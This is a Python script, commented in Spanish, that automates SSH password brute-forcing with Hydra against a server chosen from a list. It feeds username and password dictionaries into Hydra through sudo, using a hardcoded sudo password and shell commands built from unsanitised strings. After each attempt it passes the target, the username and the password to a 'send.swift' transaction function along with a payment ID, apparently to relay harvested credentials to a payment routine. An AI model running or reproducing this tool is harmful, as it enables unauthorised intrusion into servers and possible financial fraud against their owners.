import subprocess
import os
import logging
import sys
import time
import json
import requests
from typing import Dict, List
from datetime import datetime

# Añadir el directorio 'send' al PYTHONPATH
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'send'))

# from send.swift import enviar_transaccion  # Eliminar esta línea
# from config import CERT_PATH  # Eliminar esta línea
from send.utils import generate_uuid  # Importar función necesaria
from constants import paymentId  # Importar paymentId desde constants.py

# Configuración de rutas
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(BASE_DIR, "config", "config.json")  # Actualizar ruta
LOGS_DIR = os.path.join(BASE_DIR, "logs")
KEYS_DIR = os.path.join(BASE_DIR, "keys")  # Actualizar ruta

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, "ataque_hydra.log")),
        logging.StreamHandler(sys.stdout)
    ],
)
logger = logging.getLogger(__name__)

# Configuración de errores
error_logger = logging.getLogger("error_logger")
error_logger.addHandler(logging.FileHandler(os.path.join(LOGS_DIR, "errors.log")))

# Cargar configuración
def cargar_configuracion() -> Dict:
    try:
        # Eliminar la importación de hydra_ataque aquí
        with open(CONFIG_PATH, "r") as f:
            config = json.load(f)
        
        # Leer servidores y puertos desde los archivos correspondientes
        servidores = leer_diccionario("diccionarios/servidores")
        puertos = leer_diccionario("diccionarios/puertos")
        
        # Pedir la IP a escanear
        print("Seleccione la IP a escanear:")
        for i, servidor in enumerate(servidores):
            print(f"{i + 1}. {servidor.split(': ')[1]}")
        seleccion = int(input("Ingrese el número correspondiente a la IP: ")) - 1
        config["ip_servidor"] = servidores[seleccion].split(": ")[1]
        
        # Pedir el puerto SSH a utilizar
        print("Seleccione el puerto SSH a utilizar:")
        for i, puerto in enumerate(puertos):  # Cambiar 'en' por 'in'
            print(f"{i + 1}. {puerto}")
        seleccion_puerto = int(input("Ingrese el número correspondiente al puerto SSH: ")) - 1
        config["puerto_ssh"] = int(puertos[seleccion_puerto])
        
        logger.info("Configuración cargada correctamente.")
        return config
    except Exception as e:
        error_logger.error(f"Error al cargar la configuración: {e}")
        sys.exit(1)

# Leer archivo de diccionario
def leer_diccionario(ruta_archivo: str) -> List[str]:
    ruta_completa = os.path.join(BASE_DIR, "diccionarios", ruta_archivo)  # Actualizar ruta
    try:
        with open(ruta_completa, "r") as f:
            return [linea.strip() for linea in f.readlines() if not linea.startswith("#")]  # Cambiar 'para' por 'for' y 'si no' por 'if not'
    except Exception as e:
        error_logger.error(f"Error al leer el archivo {ruta_completa}: {e}")
        return []

# Función para abrir una terminal y ejecutar un comando
def abrir_terminal(comando: str, titulo: str, password: str = None) -> None:
    try:
        logger.info(f"Iniciando: {titulo}")
        if (password):
            comando = f"echo {password} | sudo -S {comando}"
        proceso = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            stdout, stderr = proceso.communicate(timeout=30)
            if proceso.returncode == 0:
                logger.info(f"Comando ejecutado correctamente: {titulo}")
            else:
                error_logger.error(f"Error al ejecutar el comando: {stderr.decode().strip()}")
        except subprocess.TimeoutExpired:
            proceso.kill()
            stdout, stderr = proceso.communicate()
            error_logger.error(f"El comando '{titulo}' excedió el tiempo de espera y fue terminado.")
    except Exception as e:
        error_logger.error(f"Error al ejecutar el comando: {e}")

# Función para realizar ataque de Hydra
def ataque_hydra(config: Dict, password: str, paymentId: str) -> None:
    from send.swift import enviar_transaccion  # Mover la importación aquí
    from config import CERT_PATH  # Mover la importación aquí
    usuarios = leer_diccionario(config["archivo_usuarios"])
    contrasenas = leer_diccionario(config["archivo_contrasenas"])
    for usuario in usuarios:
        for contrasena in contrasenas:
            comando = f"hydra -l {usuario} -p {contrasena} {config['ip_servidor']} ssh -V -t 4"  # Aumentar tareas paralelas a 4
            try:
                abrir_terminal(comando, f"Ataque Hydra a {config['ip_servidor']} con {usuario}", password)
                logger.info(f"Iniciando ataque de Hydra en {config['ip_servidor']} con usuario {usuario} y contraseña {contrasena}...")
                
                # Enviar transacción y ejecutar send_swift.py cuando se detecte una conexión exitosa
                enviar_transaccion(config["ip_servidor"], usuario, contrasena, "conexion_exitosa", paymentId)
            except Exception as e:
                error_logger.error(f"Error durante el ataque de Hydra: {e}")

def obtener_hydra_config() -> Dict:
    config = cargar_configuracion()
    return {
        "ip_servidor": config["ip_servidor"],
        "puerto_ssh": config["puerto_ssh"]
    }

# Función principal
def main() -> None:
    logger.info("Iniciando script de ataque de Hydra...")
    
    # Cargar configuración
    config = cargar_configuracion()
    
    # Contraseña para sudo
    password = "Ptf8454Jd55"
    
    # Realizar ataque de Hydra
    ataque_hydra(config, password, paymentId)

    logger.info("Script de ataque de Hydra completado.")

if __name__ == "__main__":
    main()

